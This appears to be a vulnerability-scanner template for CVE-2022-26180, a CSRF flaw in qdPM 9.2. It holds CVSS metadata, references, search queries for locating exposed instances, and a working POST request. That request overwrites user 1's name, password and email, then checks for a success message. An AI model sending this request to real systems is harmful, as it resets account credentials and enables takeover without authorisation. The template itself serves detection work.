id: CVE-2022-26180

info:
  name: qdPM 9.2 CSRF Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  description: qdPM 9.2 allows Cross-Site Request Forgery (CSRF) via the index.php/myAccount/update URI.
  impact: |
    Successful exploitation could lead to unauthorized actions performed on behalf of an authenticated user.
  remediation: |
    Implement CSRF tokens and ensure proper validation of requests to prevent CSRF attacks.
  reference:
    - https://www.exploit-db.com/exploits/50854
    - http://packetstormsecurity.com/files/166630/qdPM-9.2-Cross-Site-Request-Forgery.html
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/AggressiveUser/AggressiveUser
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2022-26180
    cwe-id: CWE-352
    epss-score: 0.00144
    epss-percentile: 0.51603
    cpe: cpe:2.3:a:qdpm:qdpm:9.2:*:*:*:*:*:*:*
  metadata:
    vendor: qdpm
    product: qdpm
    shodan-query: http.favicon.hash:762074255
    fofa-query: icon_hash=762074255
  tags: packetstorm

http:
  - method: POST
    path:
      - "{{BaseURL}}/index.php/myAccount/update"

    body: |
      sf_method=put&users[id]=1&users[photo_preview]=&users[name]=AggressiveUser&users[new_password]=TEST1122&users[email]=administrator@Lulz.com&users[photo]=&users[culture]=en

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "User information updated"
          - "Account settings saved"
        part: body
